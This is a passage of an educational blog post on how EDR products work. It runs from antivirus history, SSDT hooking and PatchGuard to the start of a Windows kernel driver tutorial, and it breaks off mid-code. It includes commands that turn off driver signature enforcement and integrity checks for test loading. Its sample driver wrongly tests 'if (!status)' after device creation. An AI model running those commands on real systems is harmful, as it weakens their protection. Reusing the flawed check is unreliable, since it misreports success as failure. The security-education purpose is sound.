# https://blog.whiteflag.io/blog/from-windows-drivers-to-a-almost-fully-working-edr/

<!DOCTYPE html><html lang="en">
  <body>
    
    <main class="app-container">
      
  <article class="post">
    
    <div class="post-content">
      <p>EDR (<strong>E</strong>ndpoint <strong>D</strong>etection and <strong>R</strong>esponse) is a kind of security products that aims at detecting abnormal activities being executed on a computer or a server.
When looking over the Internet for ressources about how EDR’s work, I realised that, even if there is quite a huge litterature about EDR’s, there is not that much article explaining how an EDR’s is architectured and how the different components of a EDR are orchestrated. This article aims at demystigying how EDR’s work building a custom one that will implement a few techniques used by real EDR’s.</p>
<p>First we will take a look at the history of anti-viruses, see how they worked and why they relied on kernel driver then we will see how to create a custom kernel driver and finally how to turn it into a almost fully working EDR.</p>
<h1 id="i-virus-history">I/ Virus history</h1>
<p>If we take a look at the <a href="https://en.wikipedia.org/wiki/Timeline_of_computer_viruses_and_worms">timeline of computer viruses and worms</a> we’ll learn that that the term “worm” was originally used by John von Neumann in an article called “Theory of self-reproducing automata” published in 1966. In this article, Neumann showed that, in theory, a program could be designed so that it is able to reproduce itself. For this work, Neumann was considered to be the theoretical “father” of computer virology.</p>
<p>The first ever working virus was called “The Creeper” and was created by Bob Thomas. This worm was the first known worm since it was able to replicate over the network (ARPANET) copying itself to remote systems. Although it is the first detected virus ever, its actions were begning since it only printed the message “I’M THE CREEPER. CATCH ME IF YOU CAN”:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/creeper_virus.png" alt="Creeper virus"></p>
<p>Knowing that such programs could be created, smart people started working on security products that would be able to remove these malwares. For example the “Reaper” whose only purposes was to delete the Creeper from infected hosts by moving accross the ARPANET. So yeah the Reaper was a worm itself, a good one sort of… This was the first anti-virus software but a lot more appeared in the late 1980s and they were all aiming the same goal: protecting computers from malwares.</p>
<h1 id="ii-how-did-anti-virus-protect-computers-">II/ How did anti-virus protect computers ?</h1>
<p>Back in the 90s, antivirus products were able to detect viruses in two ways:</p>
<ol>
<li>Via a simple heuristic analyse:
<ul>
<li>What is the name of the binary ?</li>
<li>Is it signed ?</li>
<li>What are its metadata (strings, comments…)</li>
</ul>
</li>
<li>Via a signature which is calculated for each binaries:</li>
</ol>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/mimikatz_signatures.png" alt="Mimikatz signature"></p>
<p>When dropping the binary on the disk, the anti-virus used to check if its signature was known and categorized as malicious. If so, the binary was quarantined or deleted.</p>
<p>For obvious reasons this was not enough because all of these detection methods are based on information that an attacker can manipulate. If you are blocking binaries called mimikatz.exe, I will just rename it notmimikatz.exe. If you are blocking binaries that contain a specific string, I will strip it! If you are flagging the signature of the binary, I’ll change one byte in the binary and we are good to go. Static analysis was not enough.</p>
<p>In order to detect viruses in a more sophisticated way, it was necessary to be able to analyze dynamically the system and specifically be aware of:</p>
<ul>
<li>Processes being created</li>
<li>Libraries being loaded</li>
<li>Files being modified</li>
<li>Functions beng called as well as the parameters they take</li>
</ul>
<p>If we take a look at how operating systems are architectured, we can see that they rely on two spaces:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/userspaceandkernelspace.png" alt="User space and kernel space"></p>
<p>The user space is where your processes live, where you manipulate a word file, where you call your friends on discord. Each process, running in the user space, has got its own execution environment which means that if discord crashes, word will still work. On the other side is the kernel space where the core of the operating system as well as services and drivers are running. Since the kernel space is where the kernel is running, it contains quite a few interesting information, stored in structures, for anyone who would like to monitore the system. However, as you may guess, it is not possible for a user space program to access these informations directly since the user space and kernel space are both isolated from each other:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/userspace2kernelspacedirectly.png" alt="User vs Kernel space"></p>
<p>The only way of accessing these specific structures directly is running code in the kernel space itself and the easiest way of doing that, is via a kernel driver.</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/kerneldriverbeforepatchguard.png" alt="User vs Kernel space"></p>
<p>One of the most heavily targeted structure was the SSDT (<strong>S</strong>ervice <strong>S</strong>ystem <strong>D</strong>ispatch <strong>T</strong>able). To understand why, we need to take a look at what the operating system does when you try to open a file. As a user, opening a file is nothing exceptional, you just double click on the file and a program (let’s say notepad or word) is going to open the file for you. However in order to achieve such a task, the operating system had to go through quite a few steps which are described by the following schema:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/windowsusertokernelspace.png" alt="User to kernel diagram"></p>
<p>As you can see, user applications mostly rely on the WinAPI which consists of a set of developper-friendly functions documented by Microsoft and exposed by multiple DLL’s such as kernel32.dll, user.dll or advapi.dll. So the first step to open a file, is to use the CreateFileA function exposed by the kernel32.dll, whose prototype is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span>HANDLE <span style="color:#a6e22e">CreateFileA</span>(
</span></span><span style="display:flex;"><span>    LPCSTR                lpFileName,
</span></span><span style="display:flex;"><span>    DWORD                 dwDesiredAccess,
</span></span><span style="display:flex;"><span>    DWORD                 dwShareMode,
</span></span><span style="display:flex;"><span>    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
</span></span><span style="display:flex;"><span>    DWORD                 dwCreationDisposition,
</span></span><span style="display:flex;"><span>    DWORD                 dwFlagsAndAttributes,
</span></span><span style="display:flex;"><span>    HANDLE                hTemplateFile
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>Its usage is fully documented and the function is pretty easy to use, all you need to do is to specify the path to the file you want to open as well as the desired access on it (read, write or append). Looking at the execution flow of the CreateFileA function we’ll see that, ultimately, it will call another function, NtCreateFile, exposed by the NTDLL.dll and whose prototype is the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span>__kernel_entry NTSTATUS <span style="color:#a6e22e">NtCreateFile</span>(
</span></span><span style="display:flex;"><span>    PHANDLE            FileHandle,
</span></span><span style="display:flex;"><span>    ACCESS_MASK        DesiredAccess,
</span></span><span style="display:flex;"><span>    POBJECT_ATTRIBUTES ObjectAttributes,
</span></span><span style="display:flex;"><span>    PIO_STATUS_BLOCK   IoStatusBlock,
</span></span><span style="display:flex;"><span>    PLARGE_INTEGER     AllocationSize,
</span></span><span style="display:flex;"><span>    ULONG              FileAttributes,
</span></span><span style="display:flex;"><span>    ULONG              ShareAccess,
</span></span><span style="display:flex;"><span>    ULONG              CreateDisposition,
</span></span><span style="display:flex;"><span>    ULONG              CreateOptions,
</span></span><span style="display:flex;"><span>    PVOID              EaBuffer,
</span></span><span style="display:flex;"><span>    ULONG              EaLength
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>As you can see, the prototype of the NtCreateFile function is much more complicated than the one of the CreateFileA function. The reason is that the NTDLL.dll is in fact the user mode reflection of the functions exposed by the kernel itself. As such, the NTDLL.dll is going to add a few others parameters that are needed by the kernel to perform the task of opening a file but are not managed by the developper.</p>
<p>Once all these parameters are set, the program will have to request the kernel to open the file. That means that the programm will have to call the NtCreateFile function exposed by the kernel itself. At the beginning of this article I mentionned that user space process can not directly access the kernel space, and that is true! However they can request the kernel to perform specific tasks. To request such action, you will need to trigger a specific mechanism called a <strong>system call</strong>.</p>
<p>Looking at the disassembly code of the NtCreateFile from the NTDLL.dll function we can see the following:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/ntcreatefiledisassembly.png" alt="User to kernel diagram"></p>
<p>Two things are important. The first one is the second line:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ASM" data-lang="ASM"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">eax</span>, <span style="color:#ae81ff">55</span><span style="color:#66d9ef">h</span>
</span></span></code></pre></div><p>This line moves the value 55 in the EAX register. This value, 55, is called a <strong>system call number</strong>. Each function from the NTDLL.dll is linked to a specific system call number that varies between the different version of the Windows operating system. The second important line is the syscall instruction itself:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ASM" data-lang="ASM"><span style="display:flex;"><span><span style="color:#a6e22e">syscall</span>
</span></span></code></pre></div><p>This instruction is the one that will tell the CPU to switch from the user space to the kernel space and then jump on the kernel address where the NtCreateFile function is located in the kernel. The thing is, the CPU doesn’t know where the NtCreateFile function is located. In order to find the address of the function, it will need both the system call number, stored in the EAX register, and the SSDT. Why the SSDT ? Because this structure is an index that contains a list of system call number as well as the location of the corresponding hexadecimal address of the function in the kernel:</p>
<table>
<thead>
<tr>
<th>Function</th>
<th>System call number</th>
<th>Kernel address pointer</th>
</tr>
</thead>
<tbody>
<tr>
<td>NtCreateFile</td>
<td>55</td>
<td>0x5ea54623</td>
</tr>
<tr>
<td>NtCreateIRTimer</td>
<td>ab</td>
<td>0x6bcd1576</td>
</tr>
<tr>
<td>…</td>
<td>…</td>
<td>…</td>
</tr>
</tbody>
</table>
<p>So when the CPU triggers the syscall, it looks into this structure for the syscall number 55 and jumps on the address linked to this system call number. The following schema sums up the entire process of opening a file on the Windows operating system:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/usertokerneltransition.png" alt="User to kernel diagram"></p>
<p>Once the kernel receives the request, it will request a driver (the hard disk driver in our case) to read the content of the file stored on the hard disk which, in the end, will allow notepad to print its content back to you.</p>
<p>Looking back at the SSDT, it appears that if you modify the address of the kernel functions, you can basically redirect the code flow pretty much anywhere you want. For that reason security tools editors started patching the SSDT in order to redirect calls to their own drivers so that they can analyze which functions are called and what are sent:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/ssdtpatching.png" alt="User to kernel diagram"></p>
<p>That way, throught their own drivers, defenders were able to analyze system call and determine whether or not it is legitimate or malicious.</p>
<p>If manipulating the SSDT structure is pretty trivial, manipulating some others structures can be a perilous task. In kernel space, if the code you run is buggued, the entire kernel may crash. Moreover, if the code contains logical or memory based vulnerabilities (such as stack overflow), an attacker could exploit them in order to run code directly in the kernel space (as the most privileged user on the system). Lastly, if defenders were able to use kernel drivers to access the kernel and modify its behaviour, so did the attackers with rootkits.</p>
<p>In order to protect its operating system (both from the intrusive anti-virus editors and from attackers, Microsoft created KPP (<strong>K</strong>ernel <strong>P</strong>atch <strong>P</strong>rotection) more commonly referred to as PatchGuard and released it on Windows XP/2003.</p>
<p>PatchGuard is an active security mechanism that periodically checks the state of multiple critical Windows kernel structures. If one of these structures is modified by anything other than legitimate kernel code then PatchGuard emits a fatal system error (know as “bug check”) which will initiate the reboot of the computer:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/kernel_security_check_failure.png" alt="Kernel security check failure"></p>
<p>Thus, PatchGuard was preventing modification of critical kernel structures from other components that the kernel itself. With the release of PatchGuard it was no longer for an anti-virus to hook the SSDT or any critical structures from the kernel:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/patchguard.png" alt="Patch Guard mechanism"></p>
<p>Obviously security tool editors went mad since it basically disabled pretty much all of their tools and some of them even tried to sue Microsoft.</p>
<p>To solve this issue and allow security products to monitor the system again, Microsoft added new functions to its OS that rely on a new mechanism called a <strong>callback object</strong>. Below is the definition of a callback object given by Microsoft:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/callback_objects.png" alt="Kernel security check failure"></p>
<p>Basically these functions allow a kernel driver to be notified by the kernel each time a specific action is processed. As such, it permits EDR to monitore dynamically what is happening on the system.</p>
<p>This mechanism is the first one we are going to implement in our EDR but to begin with we will need a kernel driver and thus we’ll need to have a better understanding of what a driver is and how we can develop one.</p>
<h1 id="iii-what-is-a-driver-">III/ What is a driver ?</h1>
<p>A driver is defined as a component that provides a software interface to a hardware device. A typical driver example would be the keyboard driver which translates electrical signal received from your keyboard inputs into a character that will be printed on your screen:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/keyboarddriver.png" alt="Keyboard drive exampe"></p>
<p>There are a lot of different drivers used on a system, for example the Bluetooth driver, the keyboard driver, the mouse driver and even the network input/output driver that is responsible for translating electrical signals into network packets that can be understood by the system.</p>
<p>If you want to take a look at the drivers that are running on your system, you can use the  <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/winobj">WinObj.exe tool from the SysInternals toolkit</a>:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/winobjdrivers.png" alt="Windows drivers listed by winobjdrivers"></p>
<p>Also Microsoft provides a lot of drivers samples on their <a href="https://github.com/microsoft/Windows-driver-samples">Github repository</a> if you want to take a look at what the code of a driver looks like. You’ll realise that developping a driver is pretty complicated. As mentionned before, the least memory bug will crash the driver and thus the kernel. As such, Microsoft provides a few framework that makes kernel driver development easier.</p>
<p>The main framework is called WDF (<strong>W</strong>indows <strong>D</strong>river <strong>F</strong>ramework) and is composed of two different sub-frameworks:</p>
<ul>
<li>KMDF (<strong>K</strong>ernel-<strong>M</strong>ode <strong>D</strong>river <strong>F</strong>ramework)</li>
<li>UMDF (<strong>U</strong>ser-<strong>M</strong>ode <strong>D</strong>river <strong>F</strong>ramework)</li>
</ul>
<p>Both these drivers have their pro’s and con’s:</p>
<table>
<thead>
<tr>
<th>Framework</th>
<th>Pro’s</th>
<th>Con’s</th>
</tr>
</thead>
<tbody>
<tr>
<td>KMDF</td>
<td>Gives full access to the kernel</td>
<td>Is difficult to develop</td>
</tr>
<tr>
<td>UMDF</td>
<td>Is easy to use</td>
<td>Gives access to limited functions (the WinAPI)</td>
</tr>
</tbody>
</table>
<p>Thus, before starting developping a driver, you will have to determine what are your needs and what will your driver be used for. In our case, sadly, we’ll need to develope a kernel driver (KMDF) since we will use kernel functions and to develope a driver we will need a development environment!</p>
<h1 id="iv-setting-up-a-development-environment">IV/ Setting up a development environment</h1>
<p>First things first, we will need to install Visual Studio and the Windows Driver Kit. This is unfortunately a bit of a painful process, and depends on the version of Windows that you are running. At the time of this article, for Windows 10 you will need Visual Studio 2022, with <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk">WDK</a>. Next we will have to install an additional Spectre library using the Visual Studio installer:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/spectre_library.png" alt="Spectre library to install"></p>
<p>Alternatively, if you don’t care about Spectre mitigations (which probably doesn’t matter for this test), or are having trouble with getting the versions right in Visual Studio, then you can disable it in the project properties.</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/disablespectremitigation.png" alt="Disabling spctre mitigation"></p>
<p>Next, in preparation for loading our own driver, we will disable the driver signing check. In an elevated command line prompt, type the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>bcdedit /set testsigning on
</span></span><span style="display:flex;"><span>bcdedit -debug on
</span></span></code></pre></div><p>The reason why we need to do that is because since Windows 10 version 1507, it is not possible to load drivers that are not signed by Microsoft itself to prevent rootkit exploitation. These commands simply disable the signing check and enable the debug mode which will allow us loading our driver and debug it using WinDbg. Lastly we’ll need to enable the output of kernel messages to the debugger. To do so we’ll have to add the following key:</p>
<pre tabindex="0"><code>HKLM\SYSTEM\CurrentControlSet\Control\Session Manage\Debug Print Filter
</code></pre><p>With the value 0xf:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/enabledebugmessages.png" alt="Enable debug messages"></p>
<p>Now reboot your computer. Open Visual Studio and create a new project “Kernel Mode Driver, Empty”:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/kmdf.png" alt="KMDF"></p>
<p>Once created, you should get the following project structure:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/empty_project.png" alt="Project structure"></p>
<p>Create a new source file, nameit it “driver.c” and add the following content (I’ll get back to what it does later):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Ntifs.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ntddk.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;wdf.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Global variables
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>UNICODE_STRING DEVICE_NAME <span style="color:#f92672">=</span> RTL_CONSTANT_STRING(<span style="color:#e6db74">L</span><span style="color:#e6db74">"</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Device</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">MyDumbEDR"</span>); <span style="color:#75715e">// Driver device name
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>UNICODE_STRING SYM_LINK <span style="color:#f92672">=</span> RTL_CONSTANT_STRING(<span style="color:#e6db74">L</span><span style="color:#e6db74">"</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">??</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">MyDumbEDR"</span>);        <span style="color:#75715e">// Device symlink
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">UnloadMyDumbEDR</span>(_In_ PDRIVER_OBJECT DriverObject) {
</span></span><span style="display:flex;"><span>    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span style="color:#e6db74">"MyDumbEDR: Unloading routine called</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Delete the driver device 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    IoDeleteDevice(DriverObject<span style="color:#f92672">-&gt;</span>DeviceObject);
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Delete the symbolic link
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    IoDeleteSymbolicLink(<span style="color:#f92672">&amp;</span>SYM_LINK);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NTSTATUS <span style="color:#a6e22e">DriverEntry</span>(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Prevent compiler error in level 4 warnings
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    UNREFERENCED_PARAMETER(RegistryPath);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span style="color:#e6db74">"MyDumbEDR: Initializing the driver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Variable that will store the output of WinAPI functions
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    NTSTATUS status;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Initializing a device object and creating it
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    PDEVICE_OBJECT DeviceObject;
</span></span><span style="display:flex;"><span>    UNICODE_STRING deviceName <span style="color:#f92672">=</span> DEVICE_NAME;
</span></span><span style="display:flex;"><span>    UNICODE_STRING symlinkName <span style="color:#f92672">=</span> SYM_LINK;
</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> IoCreateDevice(
</span></span><span style="display:flex;"><span>        DriverObject,		    <span style="color:#75715e">// Our driver object
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0</span>,					    <span style="color:#75715e">// Extra bytes needed (we don't need any)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">&amp;</span>deviceName,            <span style="color:#75715e">// The device name
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        FILE_DEVICE_UNKNOWN,    <span style="color:#75715e">// The device type
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#ae81ff">0</span>,					    <span style="color:#75715e">// Device characteristics (none)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        FALSE,				    <span style="color:#75715e">// Sets the driver to not exclusive
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">&amp;</span>DeviceObject		    <span style="color:#75715e">// Pointer in which is stored the result of IoCreateDevice
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>status) {
</span></span><span style="display:flex;"><span>        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span style="color:#e6db74">"MyDumbEDR: Device creation failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> status;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Creating the symlink that we will use to contact our driver
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    status <span style="color:#f92672">=</span> IoCreateSymbolicLink(
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>symlinkName, <span style="color:#75715e">// The symbolic link name
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">&amp;</span>deviceName   <span style="color:#75715e">// The device name
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>NT_SUCCESS(status)) {
</span></span><span style="display:flex;"><span>        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span style="color:#e6db74">"MyDumbEDR: Symlink creation failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">"</span>);
</span></span><span style="display:flex;"><span>        IoDeleteDevice(DeviceObject);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> status;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Setting the unload routine to execute
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DriverObject<span style="color:#f92672">-&gt;</span>DriverUnload <span style="color:#f92672">=</span> UnloadMyDumbEDR;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> status;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>In the project properties, go to “Linker &gt; Command Line” and add the following option which is going to disable the integrity check:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/linkerintegritycheck.png" alt="Disable integrity check"></p>
<p>At this point the environment is ready to build the driver. Compile the project and launch the following commands in a admin commandline (obviously adjust paths and names as needed):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sc.exe create MyDumbEDR type<span style="color:#f92672">=</span>kernel binPath<span style="color:#f92672">=</span>C:<span style="color:#ae81ff">\\</span>Users<span style="color:#ae81ff">\w</span>indev<span style="color:#ae81ff">\D</span>esktop<span style="color:#ae81ff">\x</span>64<span style="color:#ae81ff">\D</span>ebug<span style="color:#ae81ff">\M</span>yDumbEDR.sys
</span></span><span style="display:flex;"><span>sc.exe start MyDumbEDR
</span></span></code></pre></div><p>Here is the output you’ll receive on your command line:</p>
<p><img src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/driver_running.png" alt="Driver launched"></p>
<p>And if you have got dbgview opened you should see your driver saying hello:</p>
<video class="video-shortcode" preload="" controls="">
    <source src="https://blog.whiteflag.io/from-windows-drivers-to-a-almost-fully-working-edr/basicdriver.mp4" type="video/mp4">
    There should have been a video here but your browser does not seem
    to support it.
</video>




<p>Perfect! Now that the driver is running, let’s take a look at the content of a basic Windows kernel driver!</p>
<h1 id="v-developping-a-windows-kernel-driver">V/ Developping a Windows kernel driver</h1>
<p>A driver, like any binaries, is composed of a main function called a <strong>DriverEntry</strong> that has the following prototype:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>NTSTATUS <span style="color:#a6e22e">DriverEntry</span>(
</span></span><span style="display:flex;"><span>    PDRIVER_OBJECT  DriverObject,
</span></span><span style="display:flex;"><span>    PUNICODE_STRING RegistryPath
</span></span><span style="display:flex;"><span>);
</span></span></code></pre></div><p>With:</p>
<ul>
<li>DriverObject: a pointer to a structure that contains the driver’s information, below is the content of this structure:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C++" data-lang="C++"><span style="display:flex;"><span><span style="color:#75715e">//0x150 bytes (sizeof)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_DRIVER_OBJECT</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    SHORT Type;                                                                    <span style="color:#75715e">//0x0
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    SHORT Size;                                                                    <span style="color:#75715e">//0x2
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_DEVICE_OBJECT</span><span style="color:#f92672">*</span> DeviceObject;                                           <span style="color:#75715e">//0x8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONG Flags;                                                                   <span style="color:#75715e">//0x10
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    VOID<span style="color:#f92672">*</span> DriverStart;                                                             <span style="color:#75715e">//0x18
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONG DriverSize;                                                              <span style="color:#75715e">//0x20
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    VOID<span style="color:#f92672">*</span> DriverSection;                                                           <span style="color:#75715e">//0x28
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_DRIVER_EXTENSION</span><span style="color:#f92672">*</span> DriverExtension;                                     <span style="color:#75715e">//0x30
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_UNICODE_STRING</span> DriverName;                                             <span style="color:#75715e">//0x38
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_UNICODE_STRING</span><span style="color:#f92672">*</span> HardwareDatabase;                                      <span style="color:#75715e">//0x48
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_FAST_IO_DISPATCH</span><span style="color:#f92672">*</span> FastIoDispatch;                                      <span style="color:#75715e">//0x50
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    LONG (<span style="color:#f92672">*</span>DriverInit)(<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_DRIVER_OBJECT</span><span style="color:#f92672">*</span> arg1, <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_UNICODE_STRING</span><span style="color:#f92672">*</span> arg2); <span style="color:#75715e">//0x58
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    VOID (<span style="color:#f92672">*</span>DriverStartIo)(<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_DEVICE_OBJECT</span><span style="color:#f92672">*</span> arg1, <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_IRP</span><span style="color:#f92672">*</span> arg2);         <span style="color:#75715e">//0x60
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    VOID (<span style="color:#f92672">*</span>DriverUnload)(<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_DRIVER_OBJECT</span><span style="color:#f92672">*</span> arg1);                             <span style="color:#75715e">//0x68
